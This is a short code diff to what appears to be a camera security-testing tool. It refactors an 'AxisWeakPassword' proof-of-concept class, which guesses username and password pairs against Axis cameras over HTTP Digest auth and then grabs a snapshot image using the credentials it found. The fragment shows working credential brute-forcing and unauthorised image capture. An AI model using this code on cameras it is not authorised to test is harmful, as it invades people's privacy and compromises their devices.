@@ -23,7 +23,7 @@ class AxisWeakPassword(POCTemplate):
         for user in _users:
             for password in _passwords:
                 try:
-                    r = self.session.get(url=f"http://{ip}:{port}/jpg/image.jpg", auth=requests.auth.HTTPDigestAuth(user, password), timeout=self.config.timeout, headers=self.headers, verify=False)
+                    r = self.session.get(url=self.url(ip, port, "/jpg/image.jpg"), auth=requests.auth.HTTPDigestAuth(user, password), timeout=self.config.timeout, headers=self.headers, verify=False)
                     if r.status_code == 200:
                         return ip, str(port), self.product, str(user), str(password), self.name
                 except Exception as e:
@@ -32,7 +32,7 @@ class AxisWeakPassword(POCTemplate):
 
     def exploit(self, results):
         ip, port, product, user, password, vul = results
-        url = f"http://{ip}:{port}/jpg/image.jpg"
+        url = self.url(ip, port, "/jpg/image.jpg")
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
         if self._snapshot(url, img_file_name, auth=requests.auth.HTTPDigestAuth(user, password)):
             return 1
